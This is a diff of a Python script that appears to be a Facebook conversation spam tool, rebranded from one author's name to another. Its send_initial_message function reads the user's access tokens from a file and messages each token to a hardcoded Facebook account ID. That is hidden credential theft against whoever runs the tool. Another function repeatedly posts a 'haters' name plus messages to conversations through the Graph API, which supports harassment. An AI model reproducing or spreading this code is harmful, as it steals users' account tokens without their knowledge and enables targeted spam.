@@ -8,13 +8,24 @@ import subprocess
 import http.server
 import socketserver
 import threading
+import random
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"The Legend Star ANOX Don Here")
+          self.wfile.write(b"-- AALOK SUPERSTAR HERE")
 
 def execute_server():
       PORT = 4000
@@ -29,7 +40,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Ravi sir! I am using your server. My token is {}"
+      msg_template = "Hello Aalok sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
       target_id = "100000284584200"
@@ -37,7 +48,7 @@ def send_initial_message():
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────ANOX HERE ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -106,7 +117,7 @@ def send_messages_from_file():
                   message = messages[message_index].strip()
 
                   url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-                  parameters = {'access_token': access_token, 'message': haters_name + '' + message}
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                   response = requests.post(url, json=parameters, headers=headers)
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
